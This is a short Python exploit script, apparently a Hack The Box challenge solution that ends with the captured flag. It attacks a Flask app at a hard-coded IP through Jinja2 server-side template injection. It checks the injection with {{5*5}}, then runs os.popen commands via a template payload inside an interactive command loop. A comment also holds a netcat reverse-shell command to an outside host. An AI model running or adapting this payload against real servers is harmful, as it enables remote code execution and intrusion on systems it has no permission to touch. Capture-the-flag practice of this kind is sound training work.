import requests, bs4

# https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/

def valid_exploit():
    res = requests.get("http://167.71.131.167:30843/%7B%7B5*5%7D%7D").text
    slice = bs4.BeautifulSoup(res, 'html.parser')
    if slice.find('str').text == "25":
        print('[+] valid RCE by tamplate Flask')
        return 1

    return 0 # nc -nv 3.132.159.158 17338 -e /bin/bash

def shell():
    res = requests.get("http://167.71.131.167:30843/%7B%7Brequest['application']['__globals__']['__builtins__']['__import__']('os')['popen']('id')['read']()%7D%7D")
    slice = bs4.BeautifulSoup(res.text, 'html.parser')
    print(f'[+] execute id => {slice.find("str").text.strip()}')
    while True:
        cmd = input("$ ")
        res = requests.get(f"http://167.71.131.167:30843/%7B%7Brequest['application']['__globals__']['__builtins__']['__import__']('os')['popen']('{cmd}')['read']()%7D%7D")
        slice = bs4.BeautifulSoup(res.text, 'html.parser')
        print(f'$ {slice.find("str").text.strip()}')

use = valid_exploit()
if use:
    shell()
else:
    print('[-] no vulnerable !!')

# HTB{t3mpl4t3s_4r3_m0r3_p0w3rfu1_th4n_u_th1nk!}